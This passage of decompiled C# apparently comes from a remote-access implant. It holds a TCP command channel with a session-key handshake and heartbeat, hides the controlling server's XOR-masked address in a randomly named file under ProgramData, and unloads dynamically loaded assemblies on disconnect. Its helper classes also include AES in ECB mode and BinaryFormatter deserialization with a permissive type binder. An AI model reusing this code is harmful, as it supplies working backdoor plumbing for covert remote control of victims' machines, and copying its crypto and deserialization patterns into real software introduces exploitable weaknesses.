			p[offset] = (byte)w;
			p[1 + offset] = (byte)(w >> 8);
		}

		public static void cc_encode32u(byte[] p, int offset, uint l)
		{
			p[offset] = (byte)l;
			p[1 + offset] = (byte)(l >> 8);
			p[2 + offset] = (byte)(l >> 16);
			p[3 + offset] = (byte)(l >> 24);
		}

		public static byte cc_decode8u(byte[] p, int offset)
		{
			return p[offset];
		}

		public static ushort cc_decode16u(byte[] p, int offset)
		{
			return (ushort)((ushort)(0u | p[offset]) | (ushort)(p[1 + offset] << 8));
		}

		public static uint cc_decode32u(byte[] p, int offset)
		{
			return 0u | p[offset] | (uint)(p[1 + offset] << 8) | (uint)(p[2 + offset] << 16) | (uint)(p[3 + offset] << 24);
		}
	}
}
namespace newClient.Comms.TCP
{
	public class TcpServer : ISocketModule
	{
		private static readonly int TIMEOUT = 20000;

		private static readonly int mss = 4096;

		private List<byte> receivedMessage;

		private readonly int MessageHeaderSize;

		public readonly TcpClient Client;

		private bool initialcommunication;

		private NetworkStream networkStream;

		private object SyncClose = new object();

		private int ReadTimeout;

		public algorithm.AesManaged aesManaged { get; set; }

		public ProType ProtocolType
		{
			get
			{
				return ProType.TCP;
			}
			set
			{
			}
		}

		public bool Connected { get; set; }

		public Channel<byte[]> ConsumerChannel { get; set; }

		public TcpServer()
		{
			Client = new TcpClient();
			MessageHeaderSize = config.SessionKey.Length + 4;
			initialcommunication = true;
			aesManaged = new algorithm.AesManaged(config.SessionKey.Replace("@", ""));
		}

		public void setdatfile()
		{
			try
			{
				byte[] bytes = BitConverter.GetBytes((ushort)new Random().Next(1, 65535));
				byte[] bytes2 = BitConverter.GetBytes((ushort)1);
				using MemoryStream memoryStream = new MemoryStream();
				using BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
				binaryWriter.Write(bytes);
				binaryWriter.Write(bytes2);
				byte[] bytes3 = Encoding.Unicode.GetBytes(((IPEndPoint)Client.Client.RemoteEndPoint).Address.ToString());
				byte[] array = new byte[32];
				Array.Copy(bytes3, array, bytes3.Length);
				binaryWriter.Write(array);
				binaryWriter.Write((ushort)((IPEndPoint)Client.Client.RemoteEndPoint).Port);
				byte[] array2 = memoryStream.ToArray();
				for (int i = 0; i < array2.Length - 2; i++)
				{
					array2[i + 2] ^= bytes[i % 2];
				}
				try
				{
					File.WriteAllBytes(Environment.GetEnvironmentVariable("systemdrive") + "\\programdata\\sJuDr005Km.dat", array2);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}

		public bool socketConnect(string host, int port)
		{
			try
			{
				Logger.Info("socketConnect");
				Client.Connect(host, port);
				networkStream = new NetworkStream(Client.Client, ownsSocket: true);
				networkStream.ReadTimeout = 30000;
				Connected = Client.Connected;
				Logger.Info("Connected : " + Connected);
				if (Connected)
				{
					Logger.Info("Connected : " + Connected);
					receivedMessage = new List<byte>();
					ConsumerChannel = new Channel<byte[]>();
					ThreadPool.QueueUserWorkItem(AsyncClientReceived);
					socketSend(Encoding.UTF8.GetBytes(config.SessionKey));
					setdatfile();
					ThreadPool.QueueUserWorkItem(socketHEARTBEAT);
				}
				Logger.Info("Connected : " + Connected);
			}
			catch (Exception ex)
			{
				Logger.Info(ex.ToString());
				socketclose();
			}
			return Client.Connected;
		}

		public void socketHEARTBEAT(object state)
		{
			Thread.Sleep(3000);
			try
			{
				byte[] array = new byte[MessageHeaderSize];
				Encoding.UTF8.GetBytes(config.SessionKey).CopyTo(array, 0);
				BitConverter.GetBytes(268435455).CopyTo(array, config.SessionKey.Length);
				Logger.Info("socketHEARTBEAT");
				while (Connected)
				{
					if (++ReadTimeout > 3)
					{
						throw new Exception();
					}
					networkStream.Write(array, 0, array.Length);
					Thread.Sleep(10000);
				}
			}
			catch (Exception ex)
			{
				Logger.Info(ex.ToString());
				socketclose();
			}
		}

		private void AsyncClientReceived(object state)
		{
			try
			{
				byte[] array = new byte[mss];
				while (true)
				{
					int num = networkStream.Read(array, 0, mss);
					if (num == mss)
					{
						receivedMessage.AddRange(array);
					}
					else
					{
						if (num <= 0)
						{
							break;
						}
						receivedMessage.AddRange(array.Take(num));
					}
					ProcessReceivedData();
				}
				throw new Exception();
			}
			catch (Exception ex)
			{
				Logger.Info(ex.ToString());
				socketclose();
			}
		}

		private void ProcessReceivedData()
		{
			ReadTimeout = 0;
			if (receivedMessage.Count < MessageHeaderSize)
			{
				return;
			}
			MessageheadData messageheadData = bytesToMessageHeader(receivedMessage);
			if (!messageheadData._senssionSign.Equals(config.SessionKey))
			{
				receivedMessage.Clear();
				messageheadData = null;
				return;
			}
			if (receivedMessage.Count - MessageHeaderSize < messageheadData.MessageLength)
			{
				messageheadData = null;
				return;
			}
			if (receivedMessage.Count - MessageHeaderSize > messageheadData.MessageLength)
			{
				byte[] array = new byte[messageheadData.MessageLength];
				receivedMessage.CopyTo(MessageHeaderSize, array, 0, messageheadData.MessageLength);
				ConsumerChannel.TryEnqueue(array);
				receivedMessage.RemoveRange(0, MessageHeaderSize + messageheadData.MessageLength);
				ProcessReceivedData();
				array = null;
			}
			if (receivedMessage.Count - MessageHeaderSize == messageheadData.MessageLength)
			{
				byte[] array2 = new byte[messageheadData.MessageLength];
				receivedMessage.CopyTo(MessageHeaderSize, array2, 0, messageheadData.MessageLength);
				ConsumerChannel.TryEnqueue(array2);
				receivedMessage.Clear();
				array2 = null;
			}
			messageheadData = null;
		}

		private byte[] MessageHeaderTobyte(byte[] data, int headersize)
		{
			if (initialcommunication)
			{
				initialcommunication = false;
				return data;
			}
			byte[] array = new byte[MessageHeaderSize + data.Length];
			Encoding.UTF8.GetBytes(config.SessionKey).CopyTo(array, 0);
			BitConverter.GetBytes(headersize).CopyTo(array, config.SessionKey.Length);
			data.CopyTo(array, MessageHeaderSize);
			return array;
		}

		private MessageheadData bytesToMessageHeader(List<byte> receiveddata)
		{
			byte[] array = new byte[MessageHeaderSize];
			receiveddata.CopyTo(0, array, 0, MessageHeaderSize);
			return new MessageheadData
			{
				_senssionSign = Encoding.UTF8.GetString(array, 0, config.SessionKey.Length),
				MessageLength = BitConverter.ToInt32(array, config.SessionKey.Length)
			};
		}

		public int socketSend(byte[] message)
		{
			try
			{
				if (!Client.Connected || message == null || message.Length == 0)
				{
					return -1;
				}
				byte[] array = MessageHeaderTobyte(message, message.Length);
				if (Client.Client.Poll(TIMEOUT, SelectMode.SelectWrite))
				{
					networkStream.Write(array, 0, array.Length);
				}
				return 0;
			}
			catch (Exception ex)
			{
				Logger.Info(ex.ToString());
				return -1;
			}
		}

		public void socketclose()
		{
			lock (SyncClose)
			{
				if (!Connected)
				{
					return;
				}
				try
				{
					Client?.Close();
					networkStream?.Close();
					receivedMessage.Clear();
					ConsumerChannel.CompleteAdding();
				}
				catch (Exception ex)
				{
					Logger.Info(ex.ToString());
				}
				finally
				{
					AssemblyLoader.UnloadAllAssamebly();
					Connected = false;
					Logger.Info("socketclose");
					GC.Collect();
				}
			}
		}
	}
}
namespace algorithm
{
	public class AesManaged
	{
		private readonly byte[] Key;

		public AesManaged(string keyText)
		{
			Key = Encoding.UTF8.GetBytes(keyText);
		}

		public byte[] AesEncrypt(byte[] data)
		{
			using Aes aes = Aes.Create();
			aes.Mode = CipherMode.ECB;
			aes.Padding = PaddingMode.PKCS7;
			aes.BlockSize = 128;
			aes.KeySize = 256;
			aes.Key = Key;
			aes.GenerateIV();
			using ICryptoTransform cryptoTransform = aes.CreateEncryptor();
			byte[] array = cryptoTransform.TransformFinalBlock(data, 0, data.Length);
			byte[] array2 = new byte[aes.IV.Length + array.Length];
			Array.Copy(aes.IV, 0, array2, 0, aes.IV.Length);
			Array.Copy(array, 0, array2, aes.IV.Length, array.Length);
			return array2;
		}

		public byte[] AesDecrypt(byte[] encryptedData)
		{
			using Aes aes = Aes.Create();
			aes.Mode = CipherMode.ECB;
			aes.Padding = PaddingMode.PKCS7;
			aes.BlockSize = 128;
			aes.KeySize = 256;
			aes.Key = Key;
			aes.IV = encryptedData.Take(16).ToArray();
			using ICryptoTransform cryptoTransform = aes.CreateDecryptor();
			return cryptoTransform.TransformFinalBlock(encryptedData.Skip(16).ToArray(), 0, encryptedData.Length - 16);
		}
	}
	public class GZip
	{
		public static byte[] Compress(byte[] buff)
		{
			using MemoryStream memoryStream = new MemoryStream();
			byte[] bytes = BitConverter.GetBytes(buff.Length);
			memoryStream.Write(bytes, 0, 4);
			using (GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Compress))
			{
				gZipStream.Write(buff, 0, buff.Length);
				gZipStream.Flush();
			}
			return memoryStream.ToArray();
		}

		public static byte[] Decompress(byte[] buff)
		{
			using MemoryStream memoryStream = new MemoryStream(buff);
			byte[] array = new byte[4];
			memoryStream.Read(array, 0, 4);
			int num = BitConverter.ToInt32(array, 0);
			using GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress);
			byte[] array2 = new byte[num];
			gZipStream.Read(array2, 0, num);
			return array2;
		}
	}
	public class Hash
	{
		public static string GetHash(string str, string Replace)
		{
			using MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			return BitConverter.ToString(mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(str))).Replace("-", Replace);
		}
	}
	public class Serializable
	{
		public static byte[] SerialiseData<T>(T data)
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			using MemoryStream memoryStream = new MemoryStream();
			((XmlObjectSerializer)new DataContractJsonSerializer(typeof(T))).WriteObject((Stream)memoryStream, (object)data);
			return memoryStream.ToArray();
		}

		public static T DeserialiseData<T>(byte[] data)
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			using MemoryStream memoryStream = new MemoryStream(data);
			return (T)((XmlObjectSerializer)new DataContractJsonSerializer(typeof(T))).ReadObject((Stream)memoryStream);
		}

		public static byte[] Serialize(object obj)
		{
			using MemoryStream memoryStream = new MemoryStream();
			new BinaryFormatter().Serialize(memoryStream, obj);
			return memoryStream.ToArray();
		}

		public static object Deserialize(byte[] data)
		{
			using MemoryStream memoryStream = new MemoryStream(data);
			BinaryFormatter binaryFormatter = new BinaryFormatter
			{
				Binder = new UBinder()
			};
			memoryStream.Position = 0L;
			return binaryFormatter.Deserialize(memoryStream);
		}
	}
	public class UBinder : SerializationBinder
	{
		public override Type BindToType(string assemblyName, string typeName)
		{
			return Assembly.GetExecutingAssembly().GetType(typeName);
		}
	}
}
